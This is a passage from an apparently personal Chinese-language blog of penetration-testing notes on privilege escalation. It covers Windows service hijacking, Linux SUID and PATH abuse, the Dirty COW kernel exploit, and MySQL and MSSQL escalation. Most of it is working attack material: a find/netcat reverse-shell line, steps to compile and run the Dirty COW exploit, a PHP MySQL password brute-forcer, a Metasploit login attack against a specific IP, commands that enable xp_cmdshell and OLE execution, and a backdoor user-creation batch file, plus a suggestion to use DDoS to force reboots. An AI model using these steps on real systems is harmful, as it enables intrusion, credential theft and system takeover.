class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">   &lt;img src=&quot;/images/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230625101243436.png&quot; alt=&quot;image-20230625101243436&quot; style=&quot;zoom:50%;&quot; /&gt;</span><br><span class="line"></span><br><span class="line">2. 制作木马并上传</span><br><span class="line"></span><br><span class="line">3. 看到有哪些可以更改的服务，那就到该服务下，改其地址！</span><br><span class="line"></span><br><span class="line">   &lt;img src=&quot;/images/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230625101309992.png&quot; alt=&quot;image-20230625101309992&quot; style=&quot;zoom:50%;&quot; /&gt;</span><br><span class="line"></span><br><span class="line">   执行命令更改：</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>sc config “NewServiceName” binpath=“C:\Program.exe”</p>   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">   &lt;img src=&quot;/images/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230625101404246.png&quot; alt=&quot;image-20230625101404246&quot; style=&quot;zoom: 50%;&quot; /&gt;</span><br><span class="line"></span><br><span class="line">4. 启动服务</span><br><span class="line"></span><br><span class="line">## Linux提权</span><br><span class="line"></span><br><span class="line">与windows一样，也是有web和本地提权之分</span><br><span class="line"></span><br><span class="line">### 用户权限</span><br><span class="line"></span><br><span class="line">使用id查看：超过1000是普通用户</span><br><span class="line"></span><br><span class="line">### 信息搜集</span><br><span class="line"></span><br><span class="line">包括：内核信息（`cat /proc/version`，`uname -a`）、用户群组（`id`，`who`，`cat /etc/group`）、环境信息（环境变量中可能存在密码或API密钥`cat</span><br><span class="line">/etc/profile`，`/etc/bashrc`）、进程服务、计划任务、有无ssh私钥（`cat ~/.ssh/authorized_keys`）、有无明文密码（配置文件，config之类的）、可读写执行目录。</span><br><span class="line"></span><br><span class="line">自动化搜集：</span><br><span class="line"></span><br><span class="line">1. 信息：[LinEnum](https://github.com/rebootuser/LinEnum)（`./LinEnum.sh`），[linuxprivchecker](https://github.com/sleventyeleven/linuxprivchecker)（`python2 linuxprivchecker.py -w -o linuxprivchecker.log`）</span><br><span class="line">2. 漏洞：[linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)，[linux-exploit-suggester2](https://github.com/jondonas/linux-exploit-suggester-2)</span><br><span class="line"></span><br><span class="line">信息搜集有助于下一步的攻击、采取什么payload与攻击路线。</span><br><span class="line"></span><br><span class="line">而LinEnum主要检测的，除了上述，就是一些特权访问的文件、作业、任务、一些web的版本信息等</span><br><span class="line"></span><br><span class="line">### SUID提权</span><br><span class="line"></span><br><span class="line">**SUID（set user id）是一种授予文件的权限类型，允许用户以其所有者的权限执行文件。**例如，ping实用程序需要root权限才能打开网络套接字，但它也需要由标准用户执行，以验证与其他主机的连接。通过将ping程序标记为SUID（所有者为root），只要标准用户执行ping程序，便会以root特权 执行ping。</span><br><span class="line"></span><br><span class="line">但是如果某些现有的二进制文件和实用程序具有SUID权限，则可以使用它们将权限升级到root，我们可以使用它来提升我们的特权。</span><br><span class="line"></span><br><span class="line">&gt; 之前遇到的：两个指令，一个是`cp`，一个是`unzip`，使用第一个指令，复制一个文件，那么我们就可以用自己的权限打开root才能打开的文件，第二个也是。</span><br><span class="line"></span><br><span class="line">允许权限提升的已知Linux可执行文件包括：</span><br><span class="line"></span><br><span class="line">&gt; Nmap / Vim / find / Bash / mv / More / Less / Nano / cp</span><br><span class="line"></span><br><span class="line">#### 流程</span><br><span class="line"></span><br><span class="line">1. 查找SUID可执行文件</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>find / -user root -perm -4000 -print 2&gt;/dev/null<br />find / -perm -u=s -type f 2&gt;/dev/null<br />find / -user root -perm -4000 -exec ls -ldb {} ;</p>   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">   他们的特征是：有个s在他们的权限中，就是以super权限执行的程序（针对可执行文件或目录，使文件在执行阶段，**临时拥有文件所有者的权限**）。而且他们own by root。</span><br><span class="line"></span><br><span class="line">   &gt; 如果是使用`chomod u+s ???`那就是SUID</span><br><span class="line"></span><br><span class="line">   利用方式参考：https://pentestlab.blog/2017/09/25/suid-executables/</span><br><span class="line"></span><br><span class="line">2. 特定SUID利用</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>touch xiaodi<br />find xiaodi -exec whoami ;<br />find xiaodi -exec netcat -lvp 5555 -e /bin/sh ;</p><p>netcat xx.xx.xx.xx 5555</p>   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### 内核漏洞提权</span><br><span class="line"></span><br><span class="line">上传并使用脚本：[linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)，[linux-exploit-suggester2](https://github.com/jondonas/linux-exploit-suggester-2)来看看有哪些漏洞。然后上github找对应的exp。</span><br><span class="line"></span><br><span class="line">### webshell权限与脏牛提权</span><br><span class="line"></span><br><span class="line">#### 漏洞范围：</span><br><span class="line"></span><br><span class="line">Linux kernel &gt;= 2.6.22（2007年发行，到2016年10月18日才修复）</span><br><span class="line"></span><br><span class="line">#### 危害：</span><br><span class="line"></span><br><span class="line">低权限用户利用该漏洞可以在众多Linux系统上实现本地提权</span><br><span class="line"></span><br><span class="line">#### 简要分析：</span><br><span class="line"></span><br><span class="line">该漏洞具体为，get_user_page内核函数在处理Copy-on-Write(以下使用COW表示)的过程中，可能产出竞态条件造成COW过程被破坏，导致出现写数据到进程地址空间内只读内存区域的机会。修改su或者passwd程序就可以达到root的目的。具体分析请查看官方分析。</span><br><span class="line"></span><br><span class="line">参考：[脏牛Linux本地提权漏洞复现(CVE-2016-5195)](https://www.jianshu.com/p/df72d1ee1e3e)</span><br><span class="line"></span><br><span class="line">#### 流程</span><br><span class="line"></span><br><span class="line">找到攻击点，得到webshell，搜集信息，上传exp，然后编译运行：</span><br><span class="line"></span><br><span class="line">exp:https://github.com/gbonacini/CVE-2016-5195   https://www.jianshu.com/p/df72d1ee1e3e</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>upload /root/dcow.cpp /tmp<br />shell<br />ls<br />g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow dcow.cpp -lutil<br />python -c ‘import pty; pty.spawn(“/bin/bash”)’<br />./dcow</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### 环境变量提权（配合SUID）</span><br><span class="line"></span><br><span class="line">#### 背景知识</span><br><span class="line"></span><br><span class="line">使用echo命令显示当前PATH环境变量：</span><br><span class="line"></span><br><span class="line">```php</span><br><span class="line">echo $PATH</span><br><span class="line">/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games</span><br></pre></td></tr></table></figure><p>如果你在PATH变量中看到**‘.’**，则意味着登录用户可以从当前目录执行二进制文件/脚本，这对于攻击者而言也是一个提权的绝好机会。这里之所以没有指定程序的完整路径，往往是因为编写程序时的疏忽造成的。</p><p>参考：<a href="https://blog.csdn.net/qq_50854790/article/details/120941341">https://blog.csdn.net/qq_50854790/article/details/120941341</a></p><h4 id="操作"><a class="markdownIt-Anchor" href="#操作"></a> 操作</h4><p><strong>前提</strong>：</p><ul><li>配合 SUID 进行环境变量提权</li><li>本地用户权限</li></ul><p><strong>流程</strong>：手写调用文件+编译+复制文件+增加环境变量+执行触发</p><ol><li><p><strong>手写调用文件</strong>（这一步是我们为了测试用的，如果要使用这个方法进行提权，那么应该本身就要有这个suid的文件）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">gcc demo.c -o shell</span><br><span class="line">chmod u+s shell</span><br><span class="line">ls -la shell</span><br><span class="line"></span><br><span class="line">cp /bin/sh /tmp/ps</span><br><span class="line">export PATH=/tmp:$PATH</span><br><span class="line">./shell</span><br><span class="line">id</span><br><span class="line"># 或者</span><br><span class="line">cd /tmp</span><br><span class="line">echo “/bin/sh” &gt; ps</span><br><span class="line">chmod 777 ps</span><br><span class="line">export PATH=/tmp:$PATH</span><br><span class="line">cd /home/raj/script</span><br><span class="line">./shell</span><br></pre></td></tr></table></figure><p>demo.c</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">setuid</span>(<span class="number">0</span>);</span><br><span class="line"><span class="built_in">setgid</span>(<span class="number">0</span>);</span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;ps&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>复制文件</strong>：<code>cp /bin/sh /tmp/ps</code>，把<code>/bin/sh</code>复制给<code>/tmp/ps</code>，<code>ps</code>命令本来是用于显示当前进程的状态，复制后执行<code>./ps</code>就变成了执行sh命令。</p></li><li><p><strong>增加环境变量</strong>：<code>export PATH=/tmp:$PATH</code></p></li><li><p><strong>执行触发</strong>：<code>./shell</code></p></li></ol><p><strong>解释</strong>：首先我们编一个触发<code>ps</code>命令的二进制文件，当然，其他指令也行，然后将<code>/bin/sh</code>这个文件复制到一个地方，这个地方是我们可以执行文件的，例如这个地址是<code>/tmp</code>，并且重新命名为<code>ps</code>，这样，我们运行<code>/tmp/ps</code>就相当于运行<code>sh</code>，后面，我们添加环境变量，则，将<code>tmp</code>下面的二进制文件都包括进来，也就是使用<code>ps</code>将不再是原来的功能，而是执行<code>sh</code>（顺序关系），所以，当我们运行我们的二进制文件时，会调用被替换的<code>ps</code>（即<code>/tmp/ps</code>），执行<code>sh</code>。</p><p>而关于提权，因为我们编译后，这个shell文件可能会是suid的文件，也就是带有<code>s</code>权限的文件，这样我们运行就可以以root运行了。</p><h3 id="计划任务-crontab"><a class="markdownIt-Anchor" href="#计划任务-crontab"></a> 计划任务 crontab</h3><h4 id="路径问题"><a class="markdownIt-Anchor" href="#路径问题"></a> 路径问题</h4><h3 id="第三方服务"><a class="markdownIt-Anchor" href="#第三方服务"></a> 第三方服务</h3><h2 id="数据库提权"><a class="markdownIt-Anchor" href="#数据库提权"></a> 数据库提权</h2><p>在没有办法对系统进行提权的条件下，我们可以使用数据库进行提权，但需要知道数据库提权的前提条件：</p><ul><li>服务器开启数据库服务及获取到最高权限的用户密码</li><li>除了Access数据库外，其他数据库基本存在提取的可能</li></ul><p>我们需要明确：</p><ol><li><p>数据库应用提取那在权限提升中的意义</p><p>即：我们获得webshell，但是权限很低，我们通过某种方式获得数据库权限（root），于是通过这个数据库权限提升我们的webshell权限，或者直接给我们开一个用户啥的</p></li><li><p>web或本地提权如何探针数据库应用</p></li><li><p>数据库提权权限用户名密码搜集等方法</p><ol><li><p>读取网站的配置文件（了解其命名规则以及查找技巧）</p><p>关键字：sql data inc config conn database common include</p><blockquote><p>WWW/cms/inc/conn.info.php</p><p>WWW/cms/install/source/config.ini.php</p></blockquote></li><li><p>读取数据库存储或备份文件（了解其数据库存储方式以及对应内容）</p><p>例如：mysql：<code>@@basedir/data/数据库名/表名.myd</code>存的是表中的数据，而用户名密码存在一个叫<code>user</code>的表中，使用<code>select * from mysql.user</code>可以查询到</p></li><li><p>使用脚本暴力破解（<strong>了解数据库是否支持外联</strong>以及如何开启外联）</p><p>外联：只支持本机连接本机，不允许外部连接。如果不支持，那就上传脚本，如果支持，那就在自己电脑上运行。以下脚本保存在web服务器中，我们访问即可。</p><p><strong>不支持外联</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"> &lt;head&gt;</span><br><span class="line">  &lt;title&gt;Mysql账号密码在线爆破工具&lt;/title&gt;</span><br><span class="line">  &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;&gt;</span><br><span class="line"> &lt;/head&gt;</span><br><span class="line"> &lt;body&gt;</span><br><span class="line">  &lt;center&gt;</span><br><span class="line">   &lt;br&gt;&lt;br&gt;</span><br><span class="line">   &lt;h1&gt;Mysql账号密码在线爆破工具 V2.0&lt;/h1&gt;</span><br><span class="line">  &lt;br&gt;</span><br><span class="line">&lt;?php</span><br><span class="line"> if(@$_POST[&#x27;submit&#x27;])&#123;</span><br><span class="line">   $host = @$_POST[&#x27;host&#x27;];</span><br><span class="line">   if($host!==&quot;&quot;)&#123;</span><br><span class="line">    $username = &quot;root&quot;;//用户名字典</span><br><span class="line">$password = array();</span><br><span class="line">$filename = &quot;pwd.txt&quot;; //同目录下密码字典</span><br><span class="line">$i=0;</span><br><span class="line">$file = fopen($filename,&#x27;r&#x27;);</span><br><span class="line">while(! feof($file))&#123;</span><br><span class="line">$password[$i] = fgets($file);</span><br><span class="line">$i++;</span><br><span class="line">&#125;</span><br><span class="line">fclose($file);</span><br><span class="line">    echo &quot;&lt;hr&gt;&lt;br&gt;-----------------------爆破状态-----------------------&lt;br&gt;&quot;;</span><br><span class="line">    for ($l=0; $l &lt;= count($password); $l++) &#123;</span><br><span class="line">$password1 = trim($password[$l]);//除去左右空白</span><br><span class="line">if(@mysql_connect($host, $username, $password1))&#123;</span><br><span class="line">echo &quot;&lt;script&gt;alert(&#x27;数据库密码为：&#123;$password1&#125;&#x27;)&lt;/script&gt;&quot;;</span><br><span class="line">echo &quot;&lt;br&gt;&lt;br&gt;&lt;font color=&#x27;red&#x27;&gt;爆破成功--密码--&gt;&quot;.@$password1.&quot;&lt;/font&gt;&quot;;</span><br><span class="line">break;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">continue;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    echo &quot;&lt;br&gt;----------------------爆破结束-----------------------&lt;br&gt;&lt;hr&gt;&quot;;</span><br><span class="line">   &#125;else&#123;</span><br><span class="line">    echo &quot;&lt;script&gt;alert(&#x27;黑客，输入数据库IP地址&#x27;)&lt;/script&gt;&quot;;</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">  &lt;form action=&quot;Completion.php&quot; method=&quot;post&quot;&gt;</span><br><span class="line">   数据库IP地址:&lt;input type=&quot;text&quot; name=&quot;host&quot;/&gt;</span><br><span class="line">   &lt;input type=&quot;submit&quot; value=&quot;爆破&quot; name=&quot;submit&quot;/&gt;</span><br><span class="line">  &lt;/form&gt;</span><br><span class="line">&lt;center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line"> &lt;/html&gt;</span><br></pre></td></tr></table></figure><p><strong>支持外联</strong>：远程本地暴力破解，服务器本地破解</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">search mysql</span><br><span class="line">use auxiliary/scanner/mysql/mysql_login</span><br><span class="line">show options</span><br><span class="line">set rhost 47.99.71.28</span><br><span class="line">set username root</span><br><span class="line">set pass_file /opt/mysql_pwd.txt</span><br><span class="line">show options</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure></li></ol></li><li><p>目前数据库提权对应的技术以及方法</p></li></ol><h3 id="数据库端口号"><a class="markdownIt-Anchor" href="#数据库端口号"></a> 数据库端口号</h3><p><strong>关系型</strong></p><table><thead><tr><th>类型</th><th>数据库</th><th>默认端口</th></tr></thead><tbody><tr><td><strong>关系型</strong></td><td><strong>Oracle</strong></td><td><strong>1521</strong></td></tr><tr><td></td><td><strong>Sql server</strong></td><td><strong>1433</strong></td></tr><tr><td></td><td><strong>Mysql</strong></td><td><strong>3306</strong></td></tr><tr><td></td><td>Pointbase</td><td>9092</td></tr><tr><td></td><td><strong>Db2</strong></td><td><strong>50000</strong></td></tr><tr><td></td><td>Sybase</td><td>5000</td></tr><tr><td></td><td><strong>PostgreSQL</strong></td><td><strong>5432</strong></td></tr><tr><td><strong>非关系型</strong></td><td>MongoDB</td><td>27017</td></tr><tr><td></td><td><strong>Redis</strong></td><td><strong>6379</strong></td></tr><tr><td></td><td>memcached</td><td>11211</td></tr></tbody></table><h3 id="mysqludfmof启动项反弹shell"><a class="markdownIt-Anchor" href="#mysqludfmof启动项反弹shell"></a> Mysql（UDF/MOF/启动项/反弹shell）</h3><h4 id="文件存储方式"><a class="markdownIt-Anchor" href="#文件存储方式"></a> 文件存储方式</h4><p>存储数据的目录是<code>Mysql/data/数据库名/表名.myd</code>，里面有表里的数据。而用户名密码存在一个叫<code>user</code>的表中，使用<code>select * from mysql.user</code>可以查询到，我们可以在<code>Mysql/data/mysql/user.myd</code>中找到该文件！</p><h4 id="udf"><a class="markdownIt-Anchor" href="#udf"></a> UDF</h4><blockquote><p>UDF（user defind function）用户自定义函数，通过添加新函数，对MySQL的功能进行扩充。调用方式与一般系统自带的函数相同，例如user()，version()等函数。</p><p>udf 文件后缀在windows与linux系统下分别为dll与so，即动态链接库文件，由C、C++编写。</p></blockquote><p>前提是：得到数据库的账号密码（root），先导出dll，导出目录必须可以加载dll文件（secure_file_priv项设置为空），然后我们再执行命令。需要注意的问题，<strong>识别Mysql的版本</strong></p><ol><li>小于5.1：导出目录：<code>c:/windows</code>或<code>system32</code></li><li>大于等于5.1：导出安装目录<code>/lib/plugin</code>（这个<code>plugin</code>目录需要自己建立或者利用NTFS流创建）</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">&#x27;x&#x27;</span> <span class="keyword">into</span> dumpfile <span class="string">&#x27;目录/lib/plugin::INDEX_ALLOCATION&#x27;</span>;</span><br></pre></td></tr></table></figure><p><strong>怎么判定版本</strong>：<code>select @@version</code></p><p><strong>怎么找到目录</strong>：<code>select @@basedir</code></p><p><strong>怎么快速操作</strong>：</p><ol><li><p>例如，我们知道了目录为：<code>c:/mysql/</code>，版本为5.5.3，则在<code>mysql/lib</code>下创建目录，有：<code>mysql/lib/plugin</code></p></li><li><p>设置secure_file_priv项为空（my.ini）</p></li><li><p>我们有一个dll，将至上传（安装）到该目录下。就可以执行了。</p></li><li><p>过程中我们需要上传一个webshell到服务器上，然后再攻击。这个webshell可以是大马也可以是专门的mysql.php脚本。</p><ol><li><p>如果没有webshell，那就<strong>使用dumpfile通过16进制数据流写入udf文件</strong>。（当然可以Loadfile）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 0x4d5a900..... into dump file &quot;C:\\MySQL\\lib\\plugin\\udf.dll&quot;;</span><br></pre></td></tr></table></figure><p>由于不同环境下的mysql命令提示符可输入字符最大长度不同（win2003为8191，win10系统为65535），无法使用dumpfile一次性写入全部16进制字符，则需要将udf文件的16进制编码字符先进行切割，再拼接写入到一个表中，最后导出到目标系统。</p><p>流程是：<strong>创建表+insert+update concat+dumpfile</strong></p><p>注意：在进行16进制数据切割时，每段字符的长度要为4的倍数，2进制转为16进制使用取四合一法，如果位数不够会在最高位补0，补0后会破坏原始二进制文件的文件结构导致利用失败，这也是很多人此方法复现失败的原因。</p></li></ol></li></ol><p>相关问题：</p><ol><li>函数已存在： Function ‘sys_eval’ already exists。可以直接调用就调用，没办法的话就删了重新添加，如果存在但是用不了，那就重启数据库，然后重新创建。</li><li>位数不对：Can’t open shared library ‘udf.dll’ (errno: 193 )。更换32/64位</li></ol><p>参考：</p><ol><li><a href="https://www.freebuf.com/articles/database/291175.html">https://www.freebuf.com/articles/database/291175.html</a></li></ol><h4 id="mof"><a class="markdownIt-Anchor" href="#mof"></a> MOF</h4><p>成功率最低。MOF是windows中的一个文件，可以每隔5秒监控进程创建和死亡。如果我们替换这个文件，那么我们就可执行我们上传的mod，其中有一段是vbs脚本，所以可以运行cmd命令，一般是<strong>添加用户</strong>（以mysql-root权限）。</p><ul><li>导出自定义 mof 文件到系统目录加载</li><li>同udf一样需要手工修改my.ini配置文件，添加 secure-file-priv=</li></ul><p>所以流程如下：</p><ol><li>准备一个mof文件，以及前置条件，例如root权限，目录可写等等。</li><li>使用<code>select load_file(...) into dumpfile &quot;c:/mysql...&quot;</code>，替换mof。</li><li>过一会就可以了。</li></ol><p>参考：<a href="https://blog.csdn.net/Zlirving_/article/details/106618559">https://blog.csdn.net/Zlirving_/article/details/106618559</a></p><h4 id="启动项提权"><a class="markdownIt-Anchor" href="#启动项提权"></a> 启动项提权</h4><ul><li><strong>（基于配合操作系统自启动）</strong></li><li>导出自定义可执行文件到启动目录配合重启执行</li><li>将创建好的后门或执行文件进行服务器启动项写入，配合重启执行！</li></ul><p>我们需要开启外联（大马里有相关命令）<code>GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' INDENTIFIED BY 'root' WITH GRANT OPTION;</code>（执行这个当然需要root权限）</p><p>流程如下：</p><ol><li><p>要么～使用msf中的mysql_start_up模块提升权限即可</p></li><li><p>要么～上传bat文件：将创建好的bat文件进行服务器启动项写入，配合重启执行！ bat文件实例。</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">@<span class="built_in">echo</span></span><br><span class="line"><span class="built_in">net</span> user xxx <span class="number">123</span>!@#ws /add</span><br></pre></td></tr></table></figure></li><li><p>使用DDoS，让服务器重启！</p></li></ol><h4 id="反弹shell"><a class="markdownIt-Anchor" href="#反弹shell"></a> 反弹shell</h4><ul><li><p><code>nc -l -p 5577</code></p></li><li><p>nc相关知识：<a href="https://www.cnblogs.com/-chenxs/p/11748488.html">https://www.cnblogs.com/-chenxs/p/11748488.html</a></p></li></ul><p>流程如下：</p><ol><li>要么自己创建反弹函数</li><li>要么使用mysql.php创建一个反弹函数backdoor。</li></ol><h3 id="mssql"><a class="markdownIt-Anchor" href="#mssql"></a> MSSQL</h3><p>特点：</p><ol><li>默认支持外联</li></ol><h4 id="xp_cmdshell"><a class="markdownIt-Anchor" href="#xp_cmdshell"></a> xp_cmdshell</h4><p>xp_cmdshell 默认在 mssql2000 中是开启的，在 mssql2005 之后的版本中则默认禁止。</p><p>当我们使用这个函数执行命令的时候会提示：<strong>访问组件xp_cmdshell过程被阻止</strong></p><p>则我们需要开启：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;, 1</span><br><span class="line">RECONFIGURE;</span><br><span class="line">EXEC sp_configure &#x27;xp_cmdshell&#x27;, 1;</span><br><span class="line">RECONFIGURE;</span><br></pre></td></tr></table></figure><p>使用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC master.dbo.xp_cmdshell &#x27;whoami&#x27;</span><br></pre></td></tr></table></figure><p>如果 xp_cmdshell 被删除了，可以上传 xplog70.dll 进行恢复</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec master.sys.sp_addextendedproc &#x27;xp_cmdshell&#x27;, &#x27;C:\Program Files\Microsoft SQL Server\MSSQL\Binn\xplog70.dll&#x27;</span><br></pre></td></tr></table></figure><h4 id="sp_oacreate-提权"><a class="markdownIt-Anchor" href="#sp_oacreate-提权"></a> sp_oacreate 提权</h4><p>主要是用来调用 OLE 对象，利用 OLE 对象的 run 方法执行系统命令。同样，他会默认关闭，遇到和xp_cmdshell一样的问题，则打开：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;, 1;</span><br><span class="line">RECONFIGURE WITH OVERRIDE;</span><br><span class="line">EXEC sp_configure &#x27;Ole Automation Procedures&#x27;, 1;</span><br><span class="line">RECONFIGURE WITH OVERRIDE;</span><br></pre></td></tr></table></figure><p>使用（<em>注意，我们需要对输出结果重定向，不然可能输出不出来，后面我们用webshell看就好了</em>）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">declare @shell int exec sp_oacreate &#x27;wscript.shell&#x27;,@shell output exec sp_oamethod @shell,&#x27;run&#x27;,null,&#x27;c:\windows\system32\cmd.exe /c whoami &gt; c:\\1.txt&#x27;</span><br></pre></td></tr></table></figure><h4 id="沙盒提权"><a class="markdownIt-Anchor" href="#沙盒提权"></a> 沙盒提权</h4><p>参考资料：<a href="https://blog.51cto.com/11797152/2411770">https://blog.51cto.com/11797152/2411770</a></p><p>按照步骤来就好</p><ol><li><p>提权语句（show advanced options设置为1就是可以更改配置）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exec sp_configure &#x27;show advanced options&#x27;,1;</span><br><span class="line">reconfigure;</span><br></pre></td></tr></table></figure><p>不开启的话在执行 xp_regwrite 会提示让我们开启</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exec sp_configure &#x27;Ad Hoc Distributed Queries&#x27;,1;</span><br><span class="line">reconfigure;</span><br></pre></td></tr></table></figure></li><li><p>关闭沙盒模式，如果一次执行全部代码有问题，先执行上面两句代码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exec master..xp_regwrite</span><br><span 